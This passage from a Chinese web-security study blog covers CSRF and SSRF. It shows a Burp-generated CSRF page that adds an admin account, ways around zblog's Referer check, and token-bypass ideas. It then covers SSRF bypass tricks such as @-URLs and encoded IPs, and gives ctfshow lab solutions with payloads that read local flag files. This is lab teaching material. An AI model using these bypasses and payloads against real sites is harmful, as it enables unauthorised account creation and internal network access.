<code>Token</code>、二次验证、来源检测等等</li>\n<li>那这时候我们就可以通过 BP 去生成 <code>CSRF</code> 的 <code>POC</code>，将文件放到自己的网站下面，诱使受害者去点击访问</li>\n<li>当然更多是 <strong>配合 <code>XSS</code> 去打组合拳</strong></li>\n</ul>\n<p><strong>实战案例</strong></p>\n<ul>\n<li>\n<p>这里我们以 CMS 为例</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827212817814.png\" alt=\"image-20250827212817814\"></p>\n</li>\n<li>\n<p>这里是一个管理员后台，正在进行添加新的管理员的操作，我们点击保存并进行 BP 抓包</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827212954520.png\" alt=\"image-20250827212954520\"></p>\n</li>\n<li>\n<p>抓到包之后，我们右击选中 <code>Engagement tools</code> -&gt; <code>Generate CSRF PoC</code>：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827213019568.png\" alt=\"image-20250827213019568\"></p>\n</li>\n<li>\n<p>进入到下一步操作</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827213136082-1756301497388-1.png\" alt=\"image-20250827213136082\"></p>\n</li>\n<li>\n<p>点击右上角的 <code>Options</code>，勾选第一个和最后的选项，如图所示：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827213204291.png\" alt=\"image-20250827213204291\"></p>\n</li>\n<li>\n<p>最后点击 <code>Regenerate</code>，就可以生成一个用于 <a href=\"https://so.csdn.net/so/search?q=CSRF%E6%94%BB%E5%87%BB&amp;spm=1001.2101.3001.7020\">CSRF 攻击</a> 的恶意网站了，然后我们点击 <code>Copy HTML</code>，将他保存为一个 <code>html</code> 页面，放到自己的服务器上，这里就用虚拟机代替了，开启简单的服务器，恶意网址为 <code>http://192.168.0.129:8881/index.html</code></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827213317706.png\" alt=\"image-20250827213317706\"></p>\n</li>\n<li>\n<p>然后我们假装自己就是受害者，点击这个网址</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827213432006.png\" alt=\"image-20250827213432006\"></p>\n</li>\n<li>\n<p>显示成功，我们再回到刚才的那个添加管理员的页面，发现成功添加上去了</p>\n</li>\n</ul>\n<h4 id=\"三、Referer-和-Origin-检测\">三、Referer 和 Origin 检测</h4>\n<h5 id=\"原理-4\">原理</h5>\n<ul>\n<li><code>Referer</code> 和 <code>Origin</code> 都是 <code>HTTP</code> 请求头的一个字段，用于记录当前请求的 <strong>来源页面 URL</strong>（即 “从哪个页面跳转到当前请求”）</li>\n<li><strong>Referer &amp; Origin 同源策略</strong> 是指：服务器通过检查请求头中的 <code>Referer</code> / <code>Origin</code> 字段，验证请求是否来自 <strong>可信的同源域名</strong>，以此判断请求是否合法</li>\n<li><code>Referer</code> 和 <code>Origin</code> 的区别：\n<ul>\n<li><code>Origin</code> 仅包含 <strong>”协议 + 域名 + 端口“</strong>，相比于 Referer 来说更加简洁</li>\n<li><code>Referer</code> 包含完整的 URL 来源，包括 <strong>协议、域名、端口、路径、参数</strong> 等</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/index.html</span> <span class=\"meta\">HTTP/1.1</span></span><br><span class=\"line\"><span class=\"attribute\">Host</span><span class=\"punctuation\">: </span>192.168.0.129:8881</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span><span class=\"punctuation\">: </span>1</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span><span class=\"punctuation\">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0</span><br><span class=\"line\"><span class=\"attribute\">Origin</span><span class=\"punctuation\">: </span>http://192.168.0.129:8881</span><br><span class=\"line\"><span class=\"attribute\">Accept</span><span class=\"punctuation\">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class=\"line\"><span class=\"attribute\">Referer</span><span class=\"punctuation\">: </span>http://192.168.0.129:8881/index.html</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span><span class=\"punctuation\">: </span>gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span><span class=\"punctuation\">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class=\"line\"><span class=\"attribute\">Connection</span><span class=\"punctuation\">: </span>close</span><br></pre></td></tr></table></figure>\n<h5 id=\"实战案例-3\">实战案例</h5>\n<ul>\n<li>\n<p>这里演示的是 zblog 和 <code>Referer</code> 的验证</p>\n</li>\n<li>\n<p>我们还是先进行我们之前的操作，首先先添加账户并抓到那个数据包</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827214223468.png\" alt=\"image-20250827214223468\"></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827214415248.png\" alt=\"image-20250827214415248\"></p>\n</li>\n<li>\n<p>还是和之前一样的操作，我们利用 bp 上面的功能生成一个 CSRF 伪造的 <code>add.html</code>，放到我们的恶意网站上</p>\n</li>\n<li>\n<p>然后我们假装成受害者进行访问，却发现失败了</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827214637919.png\" alt=\"image-20250827214637919\"></p>\n</li>\n<li>\n<p>我们抓下这个恶意网站的数据包，查看一下</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827214723748.png\" alt=\"image-20250827214723748\"></p>\n</li>\n<li>\n<p>可以看到它的 <code>Referer</code> 是 <code>http://192.168.0.129:8881/</code>，然后提示我们非法访问，说明这里就进行了拦截，那他是怎么一个拦截逻辑呢？我们可以看看源代码进行分析</p>\n</li>\n<li>\n<p>首先我们捕获到的数据包中提交的地址是 <code>/zb_system/cmd.php</code>，传入的参数为 <code>act=MemberPst</code>，那我们就直接找到这个文件，搜索一下这个参数</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827214930202.png\" alt=\"image-20250827214930202\"></p>\n</li>\n<li>\n<p>这里就找到了，我们看到这里有一个 <code>CheckIsReferValid()</code> 函数，很明显就是检查 <code>Referer</code> 的东西，然后我们追踪看一下：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827215007873.png\" alt=\"image-20250827215007873\"></p>\n</li>\n<li>\n<p>这里他先检查 <code>CSRFToken</code>，先不管，先看下面的这个 <code>CheckHTTPRefererValid()</code> 函数，继续追踪：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827215040354.png\" alt=\"image-20250827215040354\"></p>\n</li>\n<li>\n<p>可以看到它会检查 <code>HTTP_REFERER</code> 这个属性，这个东西其实就是 <code>$_SERVER</code> 中的一个属性，如果它为空，那就返回 <code>True</code>；如果它不是当前博客的网址，就返回 <code>false</code>，这里最骚的是使用的 <code>stripos()</code> 函数去比较，也就是说只要里面包含博客的地址，都返回 <code>true</code></p>\n</li>\n<li>\n<p>那么我们通过这个代码可知，现在有两种绕过方法</p>\n<ul>\n<li><code>Referer</code> 头包含受害者的博客地址</li>\n<li><code>Referer</code> 头为空</li>\n</ul>\n</li>\n<li>\n<p>我们首先尝试一下头为空的情况，在生成的代码中添加这段代码</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!-- 添加Referrer Policy，禁止发送Referer头 --&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;referrer&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;no-referrer&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>然后我们再次尝试 CSRF 攻击，并且抓个包看看它是否还有 <code>Referer</code> 头</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827215324723.png\" alt=\"image-20250827215324723\"></p>\n</li>\n<li>\n<p>这时候可以看到，已经没有 <code>Referer</code> 头已经没有了</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827215429755.png\" alt=\"image-20250827215429755\"></p>\n</li>\n<li>\n<p>同样，我们演示一下第二种绕过方式，这里将 <code>add.html</code> 还原，把用户删掉，然后再次访问恶意链接抓包</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827215605973.png\" alt=\"image-20250827215605973\"></p>\n</li>\n<li>\n<p>将原来的改成受害者的地址</p>\n</li>\n<li>\n<p>最后也是成功添加</p>\n</li>\n</ul>\n<h5 id=\"绕过方式\">绕过方式</h5>\n<ul>\n<li>如果开启了 <code>Referer</code> 头的验证，我们可以从三方面去考虑\n<ul>\n<li><strong>Referer 改成网站的域名</strong>：但是这个必须要改数据包才行，总不能让受害者改吧，当然还有一种思路就是看能不能把这个文件名改成 <code>http://[域名]:[端口]</code> 的格式，这样加载的时候就会带上这个文件名，但是文件名不能带//，所以这个也不行</li>\n<li><strong>Referer 头置空</strong>：就是带有这个头，但是没有内容，不过这也得受害者改包</li>\n<li><strong>删除 Referer 头</strong>：这个可以实现，像上面演示的一样，但能不能绕过还是得看网站的代码怎么写的</li>\n</ul>\n</li>\n<li>一般对 <code>Referer</code> 头的检测就三种逻辑\n<ul>\n<li><strong>全部对比</strong>：一一对应，严谨对比 =&gt; 配合 xss 或者上传（触发数据包保证是同一来源）</li>\n<li><strong>匹配对比</strong>：只要包含某个域名即可 =&gt; 直接访问</li>\n<li><strong>逻辑判断隐患</strong>：置空或删除</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"四、Token-校验\">四、Token 校验</h4>\n<p><strong>原理</strong></p>\n<ul>\n<li><code>Token</code> 校验是一种通过 <strong>随机生成的字符串（<code>Token</code>）</strong> 验证请求合法性的安全机制。<code>Token</code> 作为客户端与服务器之间的 “秘密凭证”，用于证明请求是 “经授权的合法来源” 发起的，而非攻击者伪造</li>\n<li>其实就是 <strong>服务器</strong> 每次都生成一个 <strong>一次性的凭证</strong> 给用户，用户每次操作之前都需要拿着这个凭证给服务器 <strong>证明自己的身份</strong>，使用之后该 <code>Token</code> 就 <strong>失效</strong> 了，下一次操作又需要新的 <code>Token</code></li>\n</ul>\n<p><strong>绕过方式</strong></p>\n<ul>\n<li>遇到 <code>Token</code> 也不是完全没有办法，如果开发者代码逻辑写的有问题，那么我们还是有机会绕过的</li>\n<li>最常见的就是三种情况：\n<ul>\n<li><strong>复用</strong>：就是如果代码没有规定这个 <code>Token</code> 的失效时间，那它就可以重复使用</li>\n<li><strong>置空</strong>：可以尝试将 <code>Token</code> 的值置空去尝试能不能绕过验证</li>\n<li><strong>删除</strong>：也可以尝试将 <code>Token</code> 删除看看能不能绕过</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"SSRF-服务端请求伪造\">SSRF 服务端请求伪造</h3>\n<h4 id=\"一、基础知识-3\">一、基础知识</h4>\n<h5 id=\"原理-5\">原理</h5>\n<ul>\n<li>\n<p><code>SSRF</code>（<code>Server-Side Request Forgery</code>），也叫服务器端请求伪造，是一种由攻击者 <strong>诱导服务器发起非预期网络请求</strong> 的漏洞，其核心危害在于 “滥用服务器的网络权限” 突破外网限制，攻击内网服务、本地资源或第三方系统。</p>\n</li>\n<li>\n<p>它的本质就是 <strong>服务器在处理用户输入的 “网络请求目标” 时，未严格验证或过滤目标地址，导致攻击者可控制服务器向任意地址（内网、本地、第三方）发起请求</strong>。</p>\n</li>\n<li>\n<p>其实也是特别简单，就是下面这个简易的图就可以表示：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. 公网服务器A  -----&gt;  内网服务器B    (A能访问B)</span><br><span class=\"line\"></span><br><span class=\"line\">2. 攻击者  --/--&gt;   内网服务器B      (攻击者不能访问B)</span><br><span class=\"line\"></span><br><span class=\"line\">3. 攻击者  -----&gt;   公网服务器A   -----&gt;  内网服务器B  (攻击者能通过A访问B)</span><br><span class=\"line\">\t↓                                       ↑</span><br><span class=\"line\">\t----------------—间接访问-----------------</span><br></pre></td></tr></table></figure>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250901225045637.png\" alt=\"image-20250901225045637\"></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250901225147076.png\" alt=\"image-20250901225147076\"></p>\n</li>\n</ul>\n<h5 id=\"SSRF-的利用方式\">SSRF 的利用方式</h5>\n<ul>\n<li>对于 SSRF，有如下典型的利用方式：\n<ul>\n<li><strong>内网资源探测与拓扑测绘</strong>\n<ul>\n<li>探测存活主机</li>\n<li>探测开放端口与服务</li>\n</ul>\n</li>\n<li><strong>攻击内网 / 本地敏感服务</strong>\n<ul>\n<li>攻击内网 Web 服务</li>\n<li>攻击数据库/中间件</li>\n<li>攻击本地系统服务器</li>\n</ul>\n</li>\n<li><strong>协议攻击</strong>\n<ul>\n<li><code>http://、https://</code> 协议访问内网资源</li>\n<li><code>file://</code> 协议任意文件读取</li>\n<li><code>ftp://、sftp://、tftp://</code> 协议访问 FTP 服务</li>\n<li><code>dict://</code> 协议探测服务版本</li>\n<li><code>gopher://</code> 协议构造 TCP 请求，攻击 Redis、MySQL 数据库等</li>\n<li><code>ladp://</code> 轻量级目录访问协议</li>\n</ul>\n</li>\n<li><strong>绕过网络访问控制</strong>\n<ul>\n<li>绕过防火墙、ACL 等</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"SSRF-的利用条件\">SSRF 的利用条件</h5>\n<ul>\n<li>SSRF 成功利用的条件\n<ul>\n<li>服务器 <strong>存在网络请求的功能点</strong>，并且这个 <strong>请求地址用户可控</strong> =&gt; 有无注入点</li>\n<li>服务器对请求目标 <strong>缺乏有效验证/过滤</strong> =&gt; 能否绕过</li>\n<li>服务器 <strong>具备</strong> 访问目标资源的 <strong>网络权限</strong> =&gt; 有无访问权限</li>\n<li>攻击者 <strong>能够获得请求的结果</strong> =&gt; 有回显/无回显</li>\n<li>目标资源 <strong>存在可利用的弱点</strong> =&gt; 能否产生危害</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"黑白盒测试\">黑白盒测试</h5>\n<ul>\n<li>\n<p>业务功能点：</p>\n<ul>\n<li><strong>社交分享功能</strong>：获取超链接的标题等内容进行显示</li>\n<li><strong>转码服务</strong>：通过 URL 地址把原地址的网页内容调优使其适合手机屏幕浏览</li>\n<li><strong>在线翻译</strong>：给网址翻译对应网页的内容</li>\n<li><strong>图片加载/下载</strong>：例如富文本编辑器中的点击下载图片到本地；通过 URL 地址加载或下载图片</li>\n<li><strong>图片/文章收藏功能</strong>：主要其会取 URL 地址中 title 以及文本的内容作为显示以求一个好的用具体验</li>\n<li><strong>云服务厂商</strong>：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行 ssrf 测试</li>\n<li><strong>网站采集，网站抓取的地方</strong>：一些网站会针对你输入的 url 进行一些信息采集工作</li>\n<li><strong>数据库内置功能</strong>：数据库的比如 mongodb 的 copyDatabase 函数</li>\n<li><strong>邮件系统</strong>：比如接收邮件服务器地址</li>\n<li><strong>编码处理, 属性信息处理，文件处理</strong>：比如 ffpmg，ImageMagick，docx，pdf，xml 处理器等</li>\n<li><strong>未公开的 api 实现以及其他扩展调用 URL 的功能</strong>：可以利用 google 语法加上这些关键字去寻找 SSRF 漏洞</li>\n</ul>\n</li>\n<li>\n<p>URL 关键字：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">share</span><br><span class=\"line\">wap</span><br><span class=\"line\">dispaly</span><br><span class=\"line\">url</span><br><span class=\"line\">link</span><br><span class=\"line\">sourceURL</span><br><span class=\"line\">src</span><br><span class=\"line\">target</span><br><span class=\"line\">u</span><br><span class=\"line\">source</span><br><span class=\"line\">imageURL</span><br><span class=\"line\">domain</span><br><span class=\"line\">redirechtURL</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>白盒分析：代码审计（文件读取、加载、数据操作类的函数）</p>\n</li>\n</ul>\n<h4 id=\"二、实战案例\">二、实战案例</h4>\n<h5 id=\"无防护的-SSRF\">无防护的 SSRF</h5>\n<h6 id=\"原理-6\">原理</h6>\n<ul>\n<li>就是服务器对于外部请求的链接没有过滤、也没有任何检测和防护，导致可以直接利用</li>\n</ul>\n<h6 id=\"实战案例-4\">实战案例</h6>\n<ul>\n<li>\n<p>这里需要两台服务器做演示，一台服务器 A 用来做内网穿透，本机作为内网，另一台服务器 B 作为攻击者</p>\n</li>\n<li>\n<p>现在我们在服务器 B 上访问服务器 A 内网穿透的网站长这样：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250902155708782.png\" alt=\"image-20250902155708782\"></p>\n</li>\n<li>\n<p>这里我们就加载一个正常的图片，比如 <code>http://www.xiaodi8.com/zb_users/upload/2019/12/201912151576406028214564.jpg</code>，提交</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250902155742938.png\" alt=\"image-20250902155742938\"></p>\n</li>\n<li>\n<p>可以看到它解析了，现在我们本机的地址是 <code>192.168.0.100</code>（这里是方便演示，所以用实际的内网 IP 地址，利用的时候用 <code>127.0.0.1</code> 即可），我们通过浏览器直接访问它看一看：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250902155821533.png\" alt=\"image-20250902155821533\"></p>\n</li>\n<li>\n<p>能看到这里通过浏览器直接访问是看不到任何内容的，但是当我们通过刚刚的网站去访问这个地址的时候，神奇的事情就发生了：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250902155847198.png\" alt=\"image-20250902155847198\"></p>\n</li>\n<li>\n<p>这里就加载出了我本地搭建在 80 端口的网站，同样访问其他端口也是一样的，比如我们这里访问看看 <code>3306</code> 端口（这里要换成 <code>127.0.0.1</code> 才能连接上，但道理都是一样的，需要内网地址才能看到效果）：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250902155912506-1756799953515-1.png\" alt=\"image-20250902155912506\"></p>\n</li>\n<li>\n<p>比如我们这里就可以进行一些简单的利用：任意文件读取、内网探测等等</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250902155942211.png\" alt=\"image-20250902155942211\"></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250902155953943.png\" alt=\"image-20250902155953943\"></p>\n</li>\n</ul>\n<h5 id=\"有防护的-SSRF\">有防护的 SSRF</h5>\n<h6 id=\"原理-7\">原理</h6>\n<ul>\n<li>有防护的 SSRF，一般防护的方式有几种：\n<ul>\n<li><strong>白名单校验</strong>：仅允许服务器请求预定义的可信目标</li>\n<li><strong>黑名单过滤</strong>：拦截敏感地址，比如内网地址、特殊地址、危险协议等</li>\n<li><strong>URL 解析规范化</strong>：避免因 URL 格式混乱导致的验证绕过，比如 URL 中不能带@、#，不能包含多个\\、//等</li>\n<li><strong>限制请求端口</strong>：仅允许服务器访问常见的端口</li>\n<li><strong>基于异常防护</strong>：禁止加载跳转页面、禁止加载域名解析为内网地址的网站等</li>\n</ul>\n</li>\n</ul>\n<h6 id=\"绕过方式-2\">绕过方式</h6>\n<ul>\n<li>如果 <strong>限制为 <code>http://www.xxx.com</code> 域名的形式</strong>，<strong>采用 http 基于身份认证的方式绕过</strong>，即 <code>http://www.xxx.com@www.yyy.com</code>，他会去解析 <code>@</code> 符号后面的域名</li>\n<li><strong>限制请求 IP 不为内网地址</strong>：\n<ul>\n<li>采用 <strong>短网址</strong> 绕过</li>\n<li>采用 <strong>域名解析内网地址</strong> 绕过</li>\n<li>采用 <strong>进制转换</strong> 绕过</li>\n<li>采用 <strong>3xx 重定向</strong> 到内网地址绕过</li>\n</ul>\n</li>\n</ul>\n<h6 id=\"ctfshow-题目演示\">ctfshow 题目演示</h6>\n<p><strong>Web351</strong></p>\n<ul>\n<li>\n<p>源码如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);  </span><br><span class=\"line\"><span class=\"variable\">$url</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;url&#x27;</span>];  </span><br><span class=\"line\"><span class=\"variable\">$ch</span>=<span class=\"title function_ invoke__\">curl_init</span>(<span class=\"variable\">$url</span>);  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">curl_setopt</span>(<span class=\"variable\">$ch</span>, CURLOPT_HEADER, <span class=\"number\">0</span>);  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">curl_setopt</span>(<span class=\"variable\">$ch</span>, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);  </span><br><span class=\"line\"><span class=\"variable\">$result</span>=<span class=\"title function_ invoke__\">curl_exec</span>(<span class=\"variable\">$ch</span>);  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">curl_close</span>(<span class=\"variable\">$ch</span>);  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> (<span class=\"variable\">$result</span>);  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>代码很简单，POST 传入一个 <code>url</code> 值，然后进行执行显示结果</p>\n</li>\n<li>\n<p>这里就直接给出 <code>payload</code> 为 <code>url=http://127.0.0.1/flag.php</code>，<code>post</code> 传参，让他尝试显示本地 <code>flag.php</code> 文件：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250902161408653.png\" alt=\"image-20250902161408653\"></p>\n</li>\n<li>\n<p>成功拿到 flag</p>\n</li>\n<li>\n<p>当然如果知道它的完整路径也可以通过 <code>file://</code> 伪协议读取，常见的默认路径为 <code>/var/www/html/flag.php</code></p>\n</li>\n</ul>\n<p><strong>Web352</strong></p>\n<ul>\n<li>\n<p>源码如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);  </span><br><span class=\"line\"><span class=\"variable\">$url</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;url&#x27;</span>];  </span><br><span class=\"line\"><span class=\"variable\">$x</span>=<span class=\"title function_ invoke__\">parse_url</span>(<span class=\"variable\">$url</span>);  </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;scheme&#x27;</span>]**=<span class=\"string\">&#x27;http&#x27;</span>||<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;scheme&#x27;</span>]=**<span class=\"string\">&#x27;https&#x27;</span>)&#123;  </span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;  </span><br><span class=\"line\">\t\t<span class=\"variable\">$ch</span>=<span class=\"title function_ invoke__\">curl_init</span>(<span class=\"variable\">$url</span>);  </span><br><span class=\"line\">\t\t<span class=\"title function_ invoke__\">curl_setopt</span>(<span class=\"variable\">$ch</span>, CURLOPT_HEADER, <span class=\"number\">0</span>);  </span><br><span class=\"line\">\t\t<span class=\"title function_ invoke__\">curl_setopt</span>(<span class=\"variable\">$ch</span>, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);  </span><br><span class=\"line\">\t\t<span class=\"variable\">$result</span>=<span class=\"title function_ invoke__\">curl_exec</span>(<span class=\"variable\">$ch</span>);  </span><br><span class=\"line\">\t\t<span class=\"title function_ invoke__\">curl_close</span>(<span class=\"variable\">$ch</span>);  </span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> (<span class=\"variable\">$result</span>);  </span><br><span class=\"line\">\t&#125;  </span><br><span class=\"line\">\t<span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\">\t    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;hacker&#x27;</span>);  </span><br><span class=\"line\">\t&#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;hacker&#x27;</span>);  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>看看代码，POST 传入 <code>url</code>，第一个 <code>if</code> 判断要求这个 <code>url</code> 的头部必须是 <code>http</code> 或者 <code>https</code> 协议</p>\n</li>\n<li>\n<p>第二个 <code>if</code> 判断要求 <code>url</code> 参数中不能包含 <code>localhost</code> 和 <code>127.0.0</code> 字段</p>\n</li>\n<li>\n<p>那这里我们就可以用进制转换进行绕过</p>\n</li>\n<li>\n<p>这里写下 127.0.0.1 的各个进制转换的结果</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2130706433   十进制</span><br><span class=\"line\">017700000001 八进制</span><br><span class=\"line\">0x7F000001   十六进制</span><br></pre></td></tr></table></figure>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250902162739700.png\" alt=\"image-20250902162739700\"></p>\n</li>\n</ul>\n<p><strong>Web353</strong></p>\n<ul>\n<li>\n<p>源码如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span 